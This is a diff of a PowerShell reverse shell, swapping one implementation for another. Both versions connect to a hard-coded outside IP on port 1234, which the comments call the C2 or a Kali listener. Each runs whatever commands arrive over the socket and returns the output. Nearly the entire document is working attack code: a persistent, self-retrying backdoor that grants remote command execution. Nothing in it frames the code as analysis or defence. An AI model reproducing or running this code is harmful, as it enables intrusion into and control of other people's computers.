@@ -1,62 +1,43 @@
-$local_host = '165.232.175.123'  # Change this to Local Kali IP
-$local_port = 1234                # Change This to Your Local Listening Port
-$ConnectionDelay = 20                # This is a Delay > Feel free to change it to fit you needs. 
+do {
+    # Delay before establishing network connection, and between retries
+    Start-Sleep -Seconds 1
 
-function Connect-ToController($local_host, $local_port) {
-    try {
-        $client = New-Object System.Net.Sockets.TcpClient
-        $client.Connect($local_host, $local_port)
-        return $client
-    }
-    catch {
-        return $null
-    }
+    # Connect to C2
+    try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('165.232.175.123', 1234)
+    } catch {}
+} until ($TCPClient.Connected)
+
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+
+# Writes a string to C2
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
+    # Write to C2
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
 }
 
-while ($true) {
-    $conn = $null
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
 
-    while ($conn -eq $null) {
-        $conn = Connect-ToController -local_host $local_host -local_port $local_port
-        if ($conn -eq $null) {
-            
-            Start-Sleep -Seconds $ConnectionDelay
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
         }
-    }
 
-    try {
-        
-
-        while ($true) {
-            $data = New-Object byte[] 1024
-            $read = $conn.GetStream().Read($data, 0, $data.Length)
-            $command = [System.Text.Encoding]::UTF8.GetString($data, 0, $read).Trim()
-            
-            if ($command.ToLower() -eq 'exit') {
-                break
-            }
-
-            $startInfo = New-Object System.Diagnostics.ProcessStartInfo
-            $startInfo.FileName = 'powershell.exe'
-            $startInfo.Arguments = $command
-            $startInfo.RedirectStandardOutput = $true
-            $startInfo.UseShellExecute = $false
-            $startInfo.CreateNoWindow = $true
-            $process = New-Object System.Diagnostics.Process
-            $process.StartInfo = $startInfo
-            $process.Start()
-
-            $output = $process.StandardOutput.ReadToEnd()
-            $process.WaitForExit()
-
-            $conn.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
-        }
-    }
-    finally {
-        $conn.Close()
-        Write-Host "Connection closed. Reconnecting in $ConnectionDelay seconds..."
-        Start-Sleep -Seconds $ConnectionDelay
-    }
+    # Write output to C2
+    WriteToStream ($Output)
 }
-
-
+# Closes the StreamWriter and the underlying TCPClient
+$StreamWriter.Close()
